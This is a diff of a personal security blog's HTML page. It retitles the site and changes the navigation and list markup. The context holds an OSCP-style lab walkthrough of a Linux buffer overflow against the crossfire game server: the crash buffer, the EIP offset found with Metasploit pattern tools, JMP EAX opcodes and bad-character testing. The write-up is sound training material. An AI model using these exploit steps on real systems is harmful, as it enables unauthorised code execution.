@@ -3,26 +3,29 @@
 <head>
         <meta charset="utf-8" />
         <meta name="generator" content="Pelican" />
-        <title>Daniel Haggerty's Blog - Buffer Overflow</title>
+        <title>Digital Forensics - Buffer Overflow</title>
         <link rel="stylesheet" href="/theme/css/main.css" />
-        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daniel Haggerty's Blog Atom Feed" />
-        <link href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="Daniel Haggerty's Blog RSS Feed" />
+        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Digital Forensics Atom Feed" />
 </head>
 
 <body id="index" class="home">
         <header id="banner" class="body">
-                <h1><a href="/">Daniel Haggerty's Blog</a></h1>
+                <h1><a href="/">Digital Forensics</a></h1>
                 <nav><ul>
-                    <li><a href="/category/dfir.html">DFIR</a></li>
+                    <li><a href="/category/analysis.html">Analysis</a></li>
+                    <li><a href="/category/android.html">Android</a></li>
                     <li><a href="/category/docker.html">Docker</a></li>
+                    <li><a href="/category/iphone.html">iPhone</a></li>
+                    <li><a href="/category/mac.html">Mac</a></li>
                     <li><a href="/category/network.html">Network+</a></li>
                     <li><a href="/category/oscp.html">OSCP</a></li>
+                    <li><a href="/category/windows.html">Windows</a></li>
                 </ul></nav>
         </header><!-- /#banner -->
 
             <aside id="featured" class="body">
                 <article>
-                    <h1 class="entry-title"><a href="/linux-buffer-overflow.html">"Linux Buffer Overflow"</a></h1>
+                    <h1 class="entry-title"><a href="/linux-buffer-overflow.html">Linux Buffer Overflow</a></h1>
 <footer class="post-info">
         <abbr class="published" title="2019-10-31T00:00:00-05:00">
                 Published: Thu 31 October 2019
@@ -40,22 +43,27 @@
 crossfire listens on port 13327
 iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j DROP
 iptables -A INPUT -p tcp --destination-port 4444 ! -d 127.0.0.1 -j DROP</p>
-<h3>1. Run debugger and crash the app</h3>
-<p>Get POC code from exploit db
+<ol>
+<li>
+<p>Run debugger and crash the app
+Get POC code from exploit db
 edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
-crash = “\x41” <em>4379
+crash = “\x41” *4379
 buffer = “\x11(setup sound “ + crash + “\x90\x00#”
-python fuzz.py
-2. Control EIP
+python fuzz.py</p>
+</li>
+<li>
+<p>Control EIP
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
 Swap into the crash var: python linux_buffer_overflow.py 
 EIP has been overwritten with the hex characters… 46 36 70 46
 These are unique 4 bytes in the buffer. Now find where they are in the buffer.
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
-[</em>] Exact match at offset 4368
+[*] Exact match at offset 4368
 Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py</p>
-<ol>
-<li>Make space for the shellcode<br>
+</li>
+<li>
+<p>Make space for the shellcode<br>
 Check for helpful registers: Follow in dump.
 EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
 ESP points to end of buffer “C * 7” (spare bytes). 
@@ -63,7 +71,8 @@ Add 12 bytes to EAX to align EAX with the A’s =&gt; JMP EAX we skip over “se
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm &gt; add eax,12   83C00C add eax,byte +0xc
 nasm &gt; jmp eax      FFE0 jmp eax
-Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?</li>
+Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?</p>
+</li>
 <li>
 <p>Discover bad characters
 All bad chars (except x00) contained in deault named script. Can use this for future.
@@ -107,7 +116,7 @@ id; whoami</li>
             <li><article class="hentry">
                 <header>
                     <h1><a href="/windows-buffer-overflow.html" rel="bookmark"
-                           title="Permalink to "Windows Buffer Overflow"">"Windows Buffer Overflow"</a></h1>
+                           title="Permalink to Windows Buffer Overflow">Windows Buffer Overflow</a></h1>
                 </header>
 
                 <div class="entry-content">
@@ -129,21 +138,11 @@ id; whoami</li>
                 </ol><!-- /#posts-list -->
                 </section><!-- /#content -->
         <section id="extras" class="body">
-                <div class="blogroll">
-                        <h2>links</h2>
-                        <ul>
-                            <li><a href="https://getpelican.com/">Pelican</a></li>
-                            <li><a href="https://www.python.org/">Python.org</a></li>
-                            <li><a href="https://www.docker.com/">Docker</a></li>
-                        </ul>
-                </div><!-- /.blogroll -->
                 <div class="social">
                         <h2>social</h2>
                         <ul>
                             <li><a href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
-                            <li><a href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate">rss feed</a></li>
 
-                            <li><a href="#">Another social link</a></li>
                         </ul>
                 </div><!-- /.social -->
         </section><!-- /#extras -->
